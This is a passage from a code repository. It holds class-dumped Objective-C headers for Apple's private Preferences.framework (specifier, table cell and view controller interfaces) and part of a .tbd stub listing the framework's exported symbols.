- (void)confirmationViewAcceptedForSpecifier:(id)arg1;
- (void)confirmationViewCancelledForSpecifier:(id)arg1;
- (BOOL)containsSpecifier:(id)arg1;
- (id)controllerForRowAtIndexPath:(id)arg1;
- (id)controllerForSpecifier:(id)arg1;
- (void)createGroupIndices;
- (void)createPrequeuedPSTableCells:(unsigned int)arg1;
- (void)dealloc;
- (id)description;
- (void)didRotateFromInterfaceOrientation:(int)arg1;
- (void)dismissConfirmationViewForSpecifier:(id)arg1 animated:(BOOL)arg2;
- (void)dismissPopover;
- (void)dismissPopoverAnimated:(BOOL)arg1;
- (BOOL)edgeToEdgeCells;
- (void)endUpdates;
- (id)findFirstVisibleResponder;
- (BOOL)forceSynchronousIconLoadForCreatedCells;
- (void)formSheetViewWillDisappear;
- (BOOL)getGroup:(int*)arg1 row:(int*)arg2 ofSpecifier:(id)arg3;
- (BOOL)getGroup:(int*)arg1 row:(int*)arg2 ofSpecifierAtIndex:(int)arg3;
- (BOOL)getGroup:(int*)arg1 row:(int*)arg2 ofSpecifierID:(id)arg3;
- (void)handleURL:(id)arg1;
- (int)indexForIndexPath:(id)arg1;
- (int)indexForRow:(int)arg1 inGroup:(int)arg2;
- (int)indexOfGroup:(int)arg1;
- (int)indexOfSpecifier:(id)arg1;
- (int)indexOfSpecifierID:(id)arg1;
- (id)indexPathForIndex:(int)arg1;
- (id)indexPathForSpecifier:(id)arg1;
- (id)init;
- (id)initForContentSize:(CGSize)arg1;
- (void)insertContiguousSpecifiers:(id)arg1 afterSpecifier:(id)arg2 animated:(BOOL)arg3;
- (void)insertContiguousSpecifiers:(id)arg1 afterSpecifier:(id)arg2;
- (void)insertContiguousSpecifiers:(id)arg1 afterSpecifierID:(id)arg2 animated:(BOOL)arg3;
- (void)insertContiguousSpecifiers:(id)arg1 afterSpecifierID:(id)arg2;
- (void)insertContiguousSpecifiers:(id)arg1 atEndOfGroup:(int)arg2 animated:(BOOL)arg3;
- (void)insertContiguousSpecifiers:(id)arg1 atEndOfGroup:(int)arg2;
- (void)insertContiguousSpecifiers:(id)arg1 atIndex:(int)arg2 animated:(BOOL)arg3;
- (void)insertContiguousSpecifiers:(id)arg1 atIndex:(int)arg2;
- (void)insertSpecifier:(id)arg1 afterSpecifier:(id)arg2 animated:(BOOL)arg3;
- (void)insertSpecifier:(id)arg1 afterSpecifier:(id)arg2;
- (void)insertSpecifier:(id)arg1 afterSpecifierID:(id)arg2 animated:(BOOL)arg3;
- (void)insertSpecifier:(id)arg1 afterSpecifierID:(id)arg2;
- (void)insertSpecifier:(id)arg1 atEndOfGroup:(int)arg2 animated:(BOOL)arg3;
- (void)insertSpecifier:(id)arg1 atEndOfGroup:(int)arg2;
- (void)insertSpecifier:(id)arg1 atIndex:(int)arg2 animated:(BOOL)arg3;
- (void)insertSpecifier:(id)arg1 atIndex:(int)arg2;
- (void)lazyLoadBundle:(id)arg1;
- (id)loadSpecifiersFromPlistName:(id)arg1 target:(id)arg2;
- (void)loadView;
- (void)loseFocus;
- (void)migrateSpecifierMetadataFrom:(id)arg1 to:(id)arg2;
- (int)numberOfGroups;
- (BOOL)performActionForSpecifier:(id)arg1;
- (BOOL)performButtonActionForSpecifier:(id)arg1;
- (BOOL)performConfirmationActionForSpecifier:(id)arg1;
- (BOOL)performConfirmationCancelActionForSpecifier:(id)arg1;
- (BOOL)performLoadActionForSpecifier:(id)arg1;
- (void)popoverController:(id)arg1 animationCompleted:(int)arg2;
- (BOOL)popoverControllerShouldDismissPopover:(id)arg1;
- (id)popupStylePopoverController;
- (void)popupViewWillDisappear;
- (void)prepareSpecifiersMetadata;
- (void)pushController:(id)arg1 animate:(BOOL)arg2;
- (void)pushController:(id)arg1;
- (void)reload;
- (void)reloadIconForSpecifierForBundle:(id)arg1;
- (void)reloadSpecifier:(id)arg1 animated:(BOOL)arg2;
- (void)reloadSpecifier:(id)arg1;
- (void)reloadSpecifierAtIndex:(int)arg1 animated:(BOOL)arg2;
- (void)reloadSpecifierAtIndex:(int)arg1;
- (void)reloadSpecifierID:(id)arg1 animated:(BOOL)arg2;
- (void)reloadSpecifierID:(id)arg1;
- (void)reloadSpecifiers;
- (void)removeContiguousSpecifiers:(id)arg1 animated:(BOOL)arg2;
- (void)removeContiguousSpecifiers:(id)arg1;
- (void)removeLastSpecifier;
- (void)removeLastSpecifierAnimated:(BOOL)arg1;
- (void)removeSpecifier:(id)arg1 animated:(BOOL)arg2;
- (void)removeSpecifier:(id)arg1;
- (void)removeSpecifierAtIndex:(int)arg1 animated:(BOOL)arg2;
- (void)removeSpecifierAtIndex:(int)arg1;
- (void)removeSpecifierID:(id)arg1 animated:(BOOL)arg2;
- (void)removeSpecifierID:(id)arg1;
- (void)replaceContiguousSpecifiers:(id)arg1 withSpecifiers:(id)arg2 animated:(BOOL)arg3;
- (void)replaceContiguousSpecifiers:(id)arg1 withSpecifiers:(id)arg2;
- (void)returnPressedAtEnd;
- (int)rowsForGroup:(int)arg1;
- (void)selectRowForSpecifier:(id)arg1;
- (void)setCachesCells:(BOOL)arg1;
- (void)setDesiredVerticalContentOffset:(float)arg1;
- (void)setDesiredVerticalContentOffsetItemNamed:(id)arg1;
- (void)setEdgeToEdgeCells:(BOOL)arg1;
- (void)setForceSynchronousIconLoadForCreatedCells:(BOOL)arg1;
- (void)setReusesCells:(BOOL)arg1;
- (void)setSpecifier:(id)arg1;
- (void)setSpecifierID:(id)arg1;
- (void)setSpecifiers:(id)arg1;
- (void)setTitle:(id)arg1;
- (BOOL)shouldReloadSpecifiersOnResume;
- (BOOL)shouldSelectResponderOnAppearance;
- (void)showConfirmationViewForSpecifier:(id)arg1 useAlert:(BOOL)arg2 swapAlertButtons:(BOOL)arg3;
- (void)showConfirmationViewForSpecifier:(id)arg1;
- (void)showPINSheet:(id)arg1;
- (id)specifier;
- (id)specifierAtIndex:(int)arg1;
- (id)specifierForID:(id)arg1;
- (id)specifierID;
- (id)specifiers;
- (id)specifiersInGroup:(int)arg1;
- (id)table;
- (Class)tableViewClass;
- (void)updateSpecifiers:(id)arg1 withSpecifiers:(id)arg2;
- (void)updateSpecifiersInRange:(NSRange)arg1 withSpecifiers:(id)arg2;
- (float)verticalContentOffset;
- (void)viewDidAppear:(BOOL)arg1;
- (void)viewDidLayoutSubviews;
- (void)viewDidLoad;
- (void)viewDidUnload;
- (void)viewWillAppear:(BOOL)arg1;
- (void)viewWillDisappear:(BOOL)arg1;
- (void)willAnimateRotationToInterfaceOrientation:(int)arg1 duration:(double)arg2;

@end
```

`Application/Frameworks/Preferences.framework/Headers/PSSegmentTableCell.h`:

```h
/* Generated by RuntimeBrowser
   Image: /System/Library/PrivateFrameworks/Preferences.framework/Preferences
 */

@interface PSSegmentTableCell : PSControlTableCell {
    NSDictionary *_titleDict;
    NSArray *_values;
}

- (BOOL)canReload;
- (id)controlValue;
- (void)dealloc;
- (id)initWithStyle:(int)arg1 reuseIdentifier:(id)arg2 specifier:(id)arg3;
- (void)layoutSubviews;
- (id)newControl;
- (void)prepareForReuse;
- (void)refreshCellContentsWithSpecifier:(id)arg1;
- (void)setBackgroundView:(id)arg1;
- (void)setValue:(id)arg1;
- (void)setValues:(id)arg1 titleDictionary:(id)arg2;
- (id)titleLabel;

@end

```

`Application/Frameworks/Preferences.framework/Headers/PSSpecifier.h`:

```h

#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#import <UIKit/UIKit.h>

//@class CNFRegAlias, IMAccount, NSArray, NSDictionary, NSMutableDictionary, NSString;

typedef enum PSTableCellType {
	PSGroupCell,
	PSLinkCell,
	PSLinkListCell,
	PSListItemCell,
	PSTitleValueCell,
	PSSliderCell,
	PSSwitchCell,
	PSStaticTextCell,
	PSEditTextCell,
	PSSegmentCell,
	PSGiantIconCell,
	PSGiantCell,
	PSSecureEditTextCell,
	PSButtonCell,
	PSEditTextViewCell
} PSSpecifierType;


@interface PSSpecifier : NSObject {
    SEL _buttonAction;
    SEL _confirmationAction;
    SEL _confirmationCancelAction;
    SEL _controllerLoadAction;
    NSString *_name;
    NSMutableDictionary *_properties;
    NSDictionary *_shortTitleDict;
    BOOL _showContentString;
    NSDictionary *_titleDict;
    id _userInfo;
    NSArray *_values;
    SEL action;
    int autoCapsType;
    int autoCorrectionType;
    SEL cancel;
    int cellType;
    Class detailControllerClass;
    Class editPaneClass;
    SEL getter;
    int keyboardType;
    SEL setter;
    id target;
    unsigned int textFieldType;
}

//@property (retain) IMAccount * CNFRegAccount;
//@property (retain) CNFRegAlias * CNFRegAlias;
//@property (retain) CNFRegAlias * CNFRegCallerIdAlias;
@property (assign) SEL buttonAction;
@property (assign) int cellType;
@property (assign) SEL confirmationAction;
@property (assign) SEL confirmationCancelAction;
@property (assign) SEL controllerLoadAction;
@property (assign) Class detailControllerClass;
@property (assign) Class editPaneClass;
@property (retain) NSString * identifier;
@property (retain) NSString * name;
@property (retain) NSDictionary * shortTitleDictionary;
@property (assign) BOOL showContentString;
@property (assign) id target;
@property (retain) NSDictionary * titleDictionary;
@property (retain) id userInfo;
@property (retain) NSArray * values;

+ (id)_dataclassToBundleId;
+ (id)acui_linkListCellSpecifierForDataclass:(id)arg1 target:(id)arg2 set:(SEL)arg3 get:(SEL)arg4 detail:(Class)arg5;
+ (id)acui_specifierForAppWithBundleID:(id)arg1 target:(id)arg2 set:(SEL)arg3 get:(SEL)arg4;
+ (id)acui_specifierForDataclass:(id)arg1 target:(id)arg2 set:(SEL)arg3 get:(SEL)arg4;
+ (int)autoCapsTypeForString:(id)arg1;
+ (int)autoCorrectionTypeForNumber:(id)arg1;
+ (id)buttonSpecifierWithTitle:(id)arg1 target:(id)arg2 action:(SEL)arg3 confirmationInfo:(id)arg4;
+ (id)deleteButtonSpecifierWithName:(id)arg1 target:(id)arg2 action:(SEL)arg3;
+ (id)emptyGroupSpecifier;
+ (id)groupSpecifierWithFooterLinkButton:(id)arg1;
+ (id)groupSpecifierWithFooterText:(id)arg1 linkButton:(id)arg2;
+ (id)groupSpecifierWithFooterText:(id)arg1 linkButtons:(id)arg2;
+ (id)groupSpecifierWithHeader:(id)arg1 footer:(id)arg2 linkButtons:(id)arg3;
+ (id)groupSpecifierWithHeader:(id)arg1 footer:(id)arg2;
+ (id)groupSpecifierWithName:(id)arg1;
+ (int)keyboardTypeForString:(id)arg1;
+ (id)preferenceSpecifierNamed:(id)arg1 target:(id)arg2 set:(SEL)arg3 get:(SEL)arg4 detail:(Class)arg5 cell:(int)arg6 edit:(Class)arg7;
+ (id)switchSpecifierWithTitle:(id)arg1 target:(id)arg2 setter:(SEL)arg3 getter:(SEL)arg4 key:(id)arg5;

- (id)CNFRegAccount;
- (id)CNFRegAlias;
- (id)CNFRegCallerIdAlias;
- (id)acui_appBundleID;
- (id)acui_dataclass;
- (SEL)buttonAction;
- (int)cellType;
- (SEL)confirmationAction;
- (SEL)confirmationCancelAction;
- (SEL)controllerLoadAction;
- (void)dealloc;
- (id)description;
- (Class)detailControllerClass;
- (Class)editPaneClass;
- (id)identifier;
- (id)init;
- (void)loadValuesAndTitlesFromDataSource;
- (id)name;
- (id)properties;
- (id)propertyForKey:(id)arg1;
- (void)removePropertyForKey:(id)arg1;
- (void)setButtonAction:(SEL)arg1;
- (void)setCNFRegAccount:(id)arg1;
- (void)setCNFRegAlias:(id)arg1;
- (void)setCNFRegCallerIdAlias:(id)arg1;
- (void)setCellType:(int)arg1;
- (void)setConfirmationAction:(SEL)arg1;
- (void)setConfirmationCancelAction:(SEL)arg1;
- (void)setControllerLoadAction:(SEL)arg1;
- (void)setDetailControllerClass:(Class)arg1;
- (void)setEditPaneClass:(Class)arg1;
- (void)setKeyboardType:(int)arg1 autoCaps:(int)arg2 autoCorrection:(int)arg3;
- (void)setProperties:(id)arg1;
- (void)setProperty:(id)arg1 forKey:(id)arg2;
- (void)setShowContentString:(BOOL)arg1;
- (void)setTarget:(id)arg1;
- (void)setUserInfo:(id)arg1;
- (void)setValues:(id)arg1 titles:(id)arg2 shortTitles:(id)arg3 usingLocalizedTitleSorting:(BOOL)arg4;
- (void)setValues:(id)arg1 titles:(id)arg2 shortTitles:(id)arg3;
- (void)setValues:(id)arg1 titles:(id)arg2;
- (void)setupIconImageWithBundle:(id)arg1;
- (void)setupIconImageWithPath:(id)arg1;
- (id)shortTitleDictionary;
- (BOOL)showContentString;
- (id)target;
- (int)titleCompare:(id)arg1;
- (id)titleDictionary;
- (id)userInfo;
- (id)values;

@end
```

`Application/Frameworks/Preferences.framework/Headers/PSSwitchTableCell.h`:

```h
/*
 * This header is generated by classdump-dyld 0.7
 * on Friday, November 7, 2014 at 1:48:08 AM Eastern European Standard Time
 * Operating System: Version 8.1 (Build 12B411)
 * Image Source: /System/Library/PrivateFrameworks/Preferences.framework/Preferences
 * classdump-dyld is licensed under GPLv3, Copyright Â© 2013 by Elias Limneos.
 */

#import <Preferences/PSControlTableCell.h>

@class UIActivityIndicatorView;

@interface PSSwitchTableCell : PSControlTableCell {
    
//    UIActivityIndicatorView* _activityIndicator;
    
}

//@property (assign,nonatomic) BOOL loading;
-(void)dealloc;
-(void)layoutSubviews;
-(void)setValue:(id)arg1 ;
-(void)prepareForReuse;
-(BOOL)canReload;
-(void)reloadWithSpecifier:(id)arg1 animated:(BOOL)arg2 ;
-(id)initWithStyle:(int)style reuseIdentifier:(NSString *)identifier specifier:(PSSpecifier *)spec;
-(void)refreshCellContentsWithSpecifier:(id)arg1 ;
-(void)setCellEnabled:(BOOL)arg1 ;
-(id)newControl;
-(id)controlValue;
-(void)setLoading:(BOOL)arg1 ;
-(BOOL)loading;
@end

```

`Application/Frameworks/Preferences.framework/Headers/PSTableCell.h`:

```h

#import <UIKit/UITableViewCell.h>

@class UIImageView, NSString, PSSpecifier, UILongPressGestureRecognizer;

@interface PSTableCell : UITableViewCell {
    
	id _value;
	UIImageView* _checkedImageView;
	BOOL _checked;
	BOOL _shouldHideTitle;
	NSString* _hiddenTitle;
	int _alignment;
	SEL _pAction;
	id _pTarget;
	BOOL _cellEnabled;
	PSSpecifier* _specifier;
	int _type;
	BOOL _lazyIcon;
	BOOL _lazyIconDontUnload;
	BOOL _lazyIconForceSynchronous;
	NSString* _lazyIconAppID;
	BOOL _reusedCell;
	BOOL _isCopyable;
	UILongPressGestureRecognizer* _longTapRecognizer;
    
}

@property (assign,nonatomic) int type;                                                      //@synthesize type=_type - In the implementation block
@property (assign,nonatomic) BOOL reusedCell;                                               //@synthesize reusedCell=_reusedCell - In the implementation block
@property (assign,nonatomic) BOOL isCopyable;                                               //@synthesize isCopyable=_isCopyable - In the implementation block
@property (nonatomic,retain) PSSpecifier * specifier;                                       //@synthesize specifier=_specifier - In the implementation block
@property (nonatomic,retain) UILongPressGestureRecognizer * longTapRecognizer;              //@synthesize longTapRecognizer=_longTapRecognizer - In the implementation block
+(int)cellStyle;
+(id)reuseIdentifierForSpecifier:(id)arg1 ;
+(Class)cellClassForSpecifier:(id)arg1 ;
+(id)stringFromCellType:(int)arg1 ;
+(id)reuseIdentifierForClassAndType:(int)arg1 ;
+(id)reuseIdentifierForBasicCellTypes:(int)arg1 ;
+(int)cellTypeFromString:(id)arg1 ;
-(id)specifier;
-(id)valueLabel;
-(void)dealloc;
-(void)layoutSubviews;
-(void)setChecked:(BOOL)arg1 ;
-(void)setTitle:(id)arg1 ;
-(BOOL)canPerformAction:(SEL)arg1 withSender:(id)arg2 ;
-(void)setTarget:(id)arg1 ;
-(void)setType:(int)arg1 ;
-(int)type;
-(SEL)action;
-(void)setValue:(id)arg1 ;
-(id)_automationID;
-(void)setAlignment:(int)arg1 ;
-(id)scriptingInfoWithChildren;
-(id)value;
-(BOOL)canBecomeFirstResponder;
-(id)target;
-(id)title;
-(id)titleLabel;
-(void)setHighlighted:(BOOL)arg1 animated:(BOOL)arg2 ;
-(void)setSelected:(BOOL)arg1 animated:(BOOL)arg2 ;
-(void)prepareForReuse;
-(id)_contentString;
-(void)setAction:(SEL)arg1 ;
-(void)copy:(id)arg1 ;
-(void)setIcon:(id)arg1 ;
-(float)textFieldOffset;
-(BOOL)isChecked;
-(id)iconImageView;
-(void)setCellEnabled:(BOOL)arg1 ;
-(BOOL)cellEnabled;
-(BOOL)canReload;
-(void)reloadWithSpecifier:(id)arg1 animated:(BOOL)arg2 ;
-(id)initWithStyle:(int)arg1 reuseIdentifier:(id)arg2 specifier:(id)arg3 ;
-(void)setReusedCell:(BOOL)arg1 ;
-(void)refreshCellContentsWithSpecifier:(id)arg1 ;
-(void)forceSynchronousIconLoadOnNextIconLoad;
-(void)cellRemovedFromView;
-(BOOL)canBeChecked;
-(id)_copyableText;
-(void)longPressed:(id)arg1 ;
-(void)setShouldHideTitle:(BOOL)arg1 ;
-(id)blankIcon;
-(id)getLazyIcon;
-(id)getLazyIconID;
-(void)setValueChangedTarget:(id)arg1 action:(SEL)arg2 specifier:(id)arg3 ;
-(void)setCellTarget:(id)arg1 ;
-(void)setCellAction:(SEL)arg1 ;
-(id)cellTarget;
-(SEL)cellAction;
-(id)titleTextLabel;
-(id)getIcon;
-(BOOL)reusedCell;
-(BOOL)isCopyable;
-(void)setIsCopyable:(BOOL)arg1 ;
-(id)longTapRecognizer;
@end
```

`Application/Frameworks/Preferences.framework/Headers/PSViewController.h`:

```h

#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

//@class PSRootController, PSSpecifier, UIViewController<PSController>;

@interface PSViewController : UIViewController /*<PSController>*/ {
    /*UIViewController<PSController> *_parentController;
     PSRootController *_rootController;
     PSSpecifier *_specifier;*/
}

- (BOOL)canBeShownFromSuspendedState;
- (void)dealloc;
- (void)didLock;
- (void)didUnlock;
- (void)didWake;
- (void)formSheetViewDidDisappear;
- (void)formSheetViewWillDisappear;
- (void)handleURL:(id)arg1;
- (id)parentController;
- (void)popupViewDidDisappear;
- (void)popupViewWillDisappear;
- (void)pushController:(id)arg1;
- (id)readPreferenceValue:(id)arg1;
- (id)rootController;
- (void)setParentController:(id)arg1;
- (void)setPreferenceValue:(id)arg1 specifier:(id)arg2;
- (void)setRootController:(id)arg1;
- (void)setSpecifier:(id)arg1;
- (id)specifier;
- (void)statusBarWillAnimateByHeight:(float)arg1;
- (void)suspend;
- (void)willBecomeActive;
- (void)willResignActive;
- (void)willUnlock;

@end
```

`Application/Frameworks/Preferences.framework/Preferences.tbd`:

```tbd
---
archs:                 [ armv7, armv7s, arm64, arm64e ]
platform:              ios
install-name:          /System/Library/PrivateFrameworks/Preferences.framework/Preferences
current-version:       1
compatibility-version: 1
exports:
  - archs:                [ armv7, armv7s, arm64, arm64e ]
    symbols:              [ _ACMContextAddCredential,
                            _ACMContextAddCredentialWithScope,
                            _ACMContextAppendData,
                            _ACMContextContainsCredentialType,
                            _ACMContextContainsCredentialTypeEx,
                            _ACMContextContainsPassphraseCredentialWithPurpose,
                            _ACMContextCreate, _ACMContextCreateWithExternalForm,
                            _ACMContextCredentialGetProperty, _ACMContextDelete,
                            _ACMContextGetData, _ACMContextGetExternalForm,
                            _ACMContextGetInfo, _ACMContextGetTrackingNumber,
                            _ACMContextRemoveCredentialsByType,
                            _ACMContextRemoveCredentialsByTypeAndScope,
                            _ACMContextRemoveCredentialsByValue,
                            _ACMContextRemoveCredentialsByValueAndScope,
                            _ACMContextRemovePassphraseCredentialsByPurposeAndScope,
                            _ACMContextReplacePassphraseCredentialsWithScope,
                            _ACMContextSetData, _ACMContextVerifyAclConstraint,
                            _ACMContextVerifyAclConstraintForOperation,
                            _ACMContextVerifyPolicy, _ACMContextVerifyPolicyEx,
                            _ACMContextVerifyPolicyWithPreflight,
                            _ACMCredentialCreate, _ACMCredentialDelete,
                            _ACMCredentialGetProperty,
                            _ACMCredentialGetPropertyData, _ACMCredentialGetType,
                            _ACMCredentialSetProperty, _ACMGetAclAuthMethod,
                            _ACMGetEnvironmentVariable,
                            _ACMGlobalContextAddCredential,
                            _ACMGlobalContextCredentialGetProperty,
                            _ACMGlobalContextRemoveCredentialsByType,
                            _ACMGlobalContextVerifyPolicy, _ACMKernelControl,
                            _ACMParseAclAndCopyConstraintCharacteristics,
                            _ACMPing, _ACMRequirementGetPriority,
                            _ACMRequirementGetProperties,
                            _ACMRequirementGetProperty,
                            _ACMRequirementGetPropertyData,
                            _ACMRequirementGetState,
                            _ACMRequirementGetSubrequirements,
                            _ACMRequirementGetType, _ACMSetEnvironmentVariable,
                            _ACMSetEnvironmentVariableWithAccessPolicy,
                            _CompareCredentials, _CopyCredential,
                            _CreateDetailControllerInstanceWithClass,
                            _CreateRangeTimeLabel, _CreateRangeTitleLabel,
                            _DeallocCredential, _DeallocCredentialList,
                            _DeallocRequirement, _DeserializeAddCredential,
                            _DeserializeAddCredentialType,
                            _DeserializeCredential, _DeserializeCredentialList,
                            _DeserializeGetContextProperty,
                            _DeserializeProcessAcl, _DeserializeRemoveCredential,
                            _DeserializeReplacePassphraseCredential,
                            _DeserializeRequirement,
                            _DeserializeVerifyAclConstraint,
                            _DeserializeVerifyPolicy, _DeviceName, _FilePathKey,
                            _GetSerializedAddCredentialSize,
                            _GetSerializedCredentialSize,
                            _GetSerializedGetContextPropertySize,
                            _GetSerializedProcessAclSize,
                            _GetSerializedRemoveCredentialSize,
                            _GetSerializedReplacePassphraseCredentialSize,
                            _GetSerializedRequirementSize,
                            _GetSerializedVerifyAclConstraintSize,
                            _GetSerializedVerifyPolicySize,
                            _IsRegulatoryImageFromLockdown,
                            _LibCall_ACMContexAddCredentialWithScope,
                            _LibCall_ACMContexRemoveCredentialsByTypeAndScope,
                            _LibCall_ACMContextAppendData,
                            _LibCall_ACMContextCreate,
                            _LibCall_ACMContextCreateWithExternalForm,
                            _LibCall_ACMContextCredentialGetProperty,
                            _LibCall_ACMContextDelete,
                            _LibCall_ACMContextGetData,
                            _LibCall_ACMContextGetInfo,
                            _LibCall_ACMContextSetData,
                            _LibCall_ACMContextVerifyPolicyAndCopyRequirementEx,
                            _LibCall_ACMCredentialCreate,
                            _LibCall_ACMCredentialDelete,
                            _LibCall_ACMCredentialGetPropertyData,
                            _LibCall_ACMCredentialGetType,
                            _LibCall_ACMCredentialSetProperty,
                            _LibCall_ACMGetAclAuthMethod_Block,
                            _LibCall_ACMGetEnvironmentVariable,
                            _LibCall_ACMGetEnvironmentVariable_Block,
                            _LibCall_ACMGlobalContextCredentialGetProperty,
                            _LibCall_ACMGlobalContextCredentialGetProperty_Block,
                            _LibCall_ACMKernDoubleClickNotify,
                            _LibCall_ACMKernelControl,
                            _LibCall_ACMKernelControl_Block, _LibCall_ACMPing,
                            _LibCall_ACMRequirementDelete,
                            _LibCall_ACMRequirementGetPriority,
                            _LibCall_ACMRequirementGetPropertyData,
                            _LibCall_ACMRequirementGetState,
                            _LibCall_ACMRequirementGetType,
                            _LibCall_ACMSetEnvironmentVariable,
                            _LibCall_ACMTRMLoadState,
                            _LibCall_ACMTRMLoadState_Block,
                            _LibCall_ACMTRMSaveState, _LibCall_BuildCommand,
                            _LibSer_ContextCredentialGetProperty_Deserialize,
                            _LibSer_ContextCredentialGetProperty_GetSize,
                            _LibSer_ContextCredentialGetProperty_Serialize,
                            _LibSer_DeleteContext_Deserialize,
                            _LibSer_DeleteContext_GetSize,
                            _LibSer_DeleteContext_Serialize,
                            _LibSer_GetAclAuthMethod_Deserialize,
                            _LibSer_GetAclAuthMethod_GetSize,
                            _LibSer_GetAclAuthMethod_Serialize,
                            _LibSer_GlobalContextCredentialGetProperty_Deserialize,
                            _LibSer_GlobalContextCredentialGetProperty_GetSize,
                            _LibSer_GlobalContextCredentialGetProperty_Serialize,
                            _LibSer_RemoveCredentialByType_Deserialize,
                            _LibSer_RemoveCredentialByType_GetSize,
                            _LibSer_RemoveCredentialByType_Serialize,
                            _LibSer_StorageAppendData_Deserialize,
                            _LibSer_StorageAppendData_GetSize,
                            _LibSer_StorageAppendData_Serialize,
                            _LibSer_StorageGetData_Deserialize,
                            _LibSer_StorageGetData_GetSize,
                            _LibSer_StorageGetData_Serialize,
                            _LibSer_StorageSetData_Deserialize,
                            _LibSer_StorageSetData_GetSize,
                            _LibSer_StorageSetData_Serialize,
                            _LocalizableGTStringKeyForKey, _LocalizeWeeAppName,
                            _LocalizedPolarisExplanation, _NameKey,
                            _ObjectAndOffsetForURLPair, _PKAccessibilityIconKey,
                            _PKAirplaneModeIconKey, _PKAppClipsIconKey,
                            _PKAppStoreIconKey, _PKBatteryUsageIconKey,
                            _PKBatteryUsageRTLIconKey, _PKBiometricsDidUpdate,
                            _PKBluetoothIconKey, _PKBluetoothSharingIconKey,
                            _PKCalendarIconKey, _PKCameraIconKey,
                            _PKCarPlayIconKey, _PKCarrierIconKey,
                            _PKCarrierSettingsIconKey, _PKCellularDataIconKey,
                            _PKClassKitIconKey, _PKClassroomIconKey,
                            _PKCompassIconKey, _PKContactsIconKey,
                            _PKContactsRTLIconKey, _PKControlCenterIconKey,
                            _PKDNDIconKey, _PKDeveloperSettingsIconKey,
                            _PKDisplayIconKey, _PKEthernetIconKey,
                            _PKExposureNotificationIconKey, _PKFaceIDIconKey,
                            _PKFaceTimeIconKey, _PKFilesIconKey,
                            _PKGameCenterIconKey, _PKGeneralIconKey,
                            _PKHealthIconKey, _PKHomeDataIconKey,
                            _PKHomeScreenIconKey, _PKIconCacheImageNameKey,
                            _PKInternalSettingsIconKey,
                            _PKIsUSBRestrictedModeDisabledByMobileAsset,
                            _PKKeychainSyncIconKey, _PKLanguageIconKey,
                            _PKLocationIconKey, _PKLogForCategory, _PKMailIconKey,
                            _PKMapsIconKey, _PKMeasureIconKey,
                            _PKMediaLibraryIconKey, _PKMessagesIconKey,
                            _PKMicrophoneIconKey, _PKMotionIconKey,
                            _PKMusicIconKey, _PKNetworkIconKey, _PKNewsIconKey,
                            _PKNotesIconKey, _PKNotificationCenterIconKey,
                            _PKPasscodeIconKey, _PKPencilIconKey,
                            _PKPersonalHotspotIconKey, _PKPhoneIconKey,
                            _PKPhotosIconKey, _PKPrivacyIconKey,
                            _PKRemindersIconKey, _PKRemindersRTLIconKey,
                            _PKSOSIconKey, _PKSafariIconKey, _PKScreenTimeIconKey,
                            _PKSensorKitIconKey, _PKShortcutsIconKey,
                            _PKSiriIconKey, _PKSoundsIconKey,
                            _PKSpeechRecognitionIconKey, _PKStocksIconKey,
                            _PKTVAppIconKey, _PKTouchIDIconKey,
                            _PKTranslateIconKey, _PKVPNIconKey, _PKVideoIconKey,
                            _PKVideoSubscriberIconKey, _PKVoiceMemosIconKey,
                            _PKWalletIconKey, _PKWallpaperIconKey,
                            _PKWeatherIconKey, _PKWiFiIconKey, _PKiBooksIconKey,
                            _PKiCloudBackupIconKey, _PKiCloudIconKey,
                            _PKiTunesIconKey, _PRDActionChangeStoragePlan,
                            _PRDActionDeviceOffers,
                            _PRDActionFreshmintStorageUpgrade,
                            _PRDActionManageBackupDomains,
                            _PRDActionTapPhotosRow,
                            _PSAbbreviatedFormattedTimeString,
                            _PSAbbreviatedFormattedTimeStringWithDays,
                            _PSAboutDeviceSupervision,
                            _PSAboutLocationAndPrivacyText, _PSAccessoryKey,
                            _PSAccountSettingsDataclassesKey,
                            _PSAccountsClientDataclassFilterKey, _PSActionKey,
                            _PSAdjustFontSizeToFitWidthKey, _PSAirDropImage,
                            _PSAlignmentKey, _PSAllowMultilineTitleKey,
                            _PSAnimationOptionsFromAnimationCurve,
                            _PSAppGroupBundleIDKey, _PSAppGroupDomainKey,
                            _PSAppIconImageNamed, _PSAppSettingsBundleIDKey,
                            _PSAppSettingsBundleKey, _PSAppTintColor,
                            _PSApplicationDisplayIdentifiersCapability,
                            _PSApplicationSpecifierForAccountsSection,
                            _PSApplicationSpecifierForAddAccountButton,
                            _PSApplicationSpecifierForAssistantSection,
                            _PSApplicationSpecifierForAssistantSectionForBundleId,
                            _PSApplicationSpecifierForBBSection,
                            _PSApplyBuddyThemeToNavigationBar,
                            _PSAudioAccessoryLicenseFilePath,
                            _PSAudioAccessoryWarrantyFilePath,
                            _PSAuthorizationTokenForPasscode, _PSAutoCapsKey,
                            _PSAutoCorrectionKey, _PSAutoWhiteBalanceCapability,
                            _PSBTAccessoryListeningMode,
                            _PSBTSetAccessoryListeningMode, _PSBackupClass,
                            _PSBadgeNumberKey, _PSBestGuesserKey,
                            _PSBlankIconImage, _PSBundleCustomIconPathKey,
                            _PSBundleHasBundleIconKey, _PSBundleHasIconKey,
                            _PSBundleIconPathKey,
                            _PSBundleIdentifierDocumentsApp,
                            _PSBundleIdentifierMaps, _PSBundleIdentifierNews,
                            _PSBundleIdentifierPlaygroundsBeta,
                            _PSBundleIdentifierPodcasts,
                            _PSBundleIdentifierSchoolwork,
                            _PSBundleIdentifierStocks, _PSBundleIdentifierTV,
                            _PSBundleIdentifieriBooks,
                            _PSBundleIdentifieriTunesU, _PSBundleIsControllerKey,
                            _PSBundleOverridePrincipalClassKey,
                            _PSBundlePathForPreferenceBundle, _PSBundlePathKey,
                            _PSBundleSearchControllerClassKey,
                            _PSBundleSearchIconPathKey,
                            _PSBundleSupportsSearchKey,
                            _PSBundleTintedIconPathKey, _PSButtonActionKey,
                            _PSCancelKey, _PSCapacityBarBackgroundColorKey,
                            _PSCapacityBarDataKey, _PSCapacityBarForceLoadingKey,
                            _PSCapacityBarHideLegendKey,
                            _PSCapacityBarLegendTextColorKey,
                            _PSCapacityBarLoadingKey,
                            _PSCapacityBarOtherDataColorKey,
                            _PSCapacityBarOtherDataLegendTextKey,
                            _PSCapacityBarSeparatorColorKey,
                            _PSCapacityBarShowOtherDataLegendKey,
                            _PSCapacityBarSizeFormatKey,
                            _PSCapacityBarSizeLblUsesStandardFontKey,
                            _PSCapacityBarSizeTextColorKey,
                            _PSCapacityBarSizesAreMemKey,
